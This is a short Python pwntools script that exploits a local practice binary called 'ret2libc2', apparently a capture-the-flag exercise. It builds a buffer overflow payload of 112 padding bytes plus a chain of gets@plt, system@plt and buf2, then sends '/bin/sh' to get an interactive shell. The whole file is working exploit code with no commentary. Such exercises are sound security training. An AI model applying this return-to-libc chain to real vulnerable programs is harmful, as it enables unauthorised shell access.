from os import system
from pwn import *

elf = ELF('./ret2libc2')

gets_plt_addr = elf.plt['gets']
system_plt_addr = elf.plt['system']
buf2_addr = elf.symbols['buf2']

payload = b'A' * 112 + p32(gets_plt_addr) + p32(system_plt_addr) + p32(buf2_addr) + p32(buf2_addr)

sh = process('./ret2libc2')

sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()